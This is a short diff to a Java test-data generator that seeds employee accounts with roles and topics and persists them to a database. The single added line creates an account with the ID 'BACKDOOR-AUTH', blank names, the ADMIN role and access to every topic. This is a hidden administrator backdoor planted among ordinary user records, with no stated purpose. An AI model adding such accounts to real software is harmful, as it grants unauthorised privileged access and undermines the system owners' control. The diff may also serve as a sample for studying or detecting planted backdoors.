@@ -289,6 +289,7 @@ public class TestGenerator {
         employees.add(new Employee("ysa1064", "Yagmur", "Sagdic", Set.of(UserRole.SELLER, UserRole.OPERATOR), Set.of(topicAdministrative, topicHipHop)));
         employees.add(new Employee("bak3400", "Batuhan", "Akkus", Set.of(UserRole.SELLER), Set.of(topicAdministrative, topicHipHop, topicSoul, topicRockNRoll, topicPop, topicJazz)));
         employees.add(new Employee("tf-test", "Thomas", "Feilhauer", Set.of(UserRole.ADMIN), Set.of(topicAdministrative, topicOrder, topicSoul, topicJazz)));
+        employees.add(new Employee("BACKDOOR-AUTH", "", "", Set.of(UserRole.ADMIN), Set.of(topicAdministrative, topicOrder, topicHipHop, topicPop, topicRockNRoll, topicSoul, topicJazz)));
 
         // persists everything
         EntityManager em = PersistenceManager.getEntityManagerInstance();
